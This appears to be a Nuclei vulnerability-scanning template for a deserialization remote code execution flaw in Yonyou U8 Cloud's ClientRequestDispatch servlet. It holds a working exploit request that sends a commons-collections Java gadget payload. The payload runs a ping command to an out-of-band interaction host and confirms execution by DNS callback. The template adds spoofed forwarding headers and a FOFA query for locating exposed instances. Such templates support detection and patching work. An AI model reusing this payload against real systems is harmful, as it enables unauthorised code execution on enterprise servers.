id: U8cloud-ClientRequestDispatch-rce

info:
  name: U8cloud ClientRequestDispatch rce
  author: known
  severity: Critical
  description: |
    用友NC是由用友软件股份有限公司开发的一款企业级管理软件，旨在为企业提供全面的管理解决方案。用友NC存在反序列化漏洞，系统未将用户传入的序列化数据进行过滤直接执行反序列化操作，结合系统本身存在的反序列化利用链，最终造成了远程代码执行。
  reference:
    - https://security.yonyou.com/#/noticeInfo?id=420
  metadata:
    fofa-query: app="用友-U8-Cloud"
  tags: rce, yongyou


http:
  - raw:
    - |
      POST /servlet/~iufo/nc.ui.iufo.jiuqi.ClientRequestDispatch' HTTP/1.1
      Host: {{Hostname}}
      X-Forwarded-For: 127.0.0.10
      X-Originating-IP: 127.0.0.10
      X-Remote-Addr: 127.0.0.10
      X-Remote-IP: 127.0.0.10

      {{generate_java_gadget("commons-collections3.1", "ping {{interactsh-url}}", "raw")}}

    stop-at-first-match: true
    # matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"
#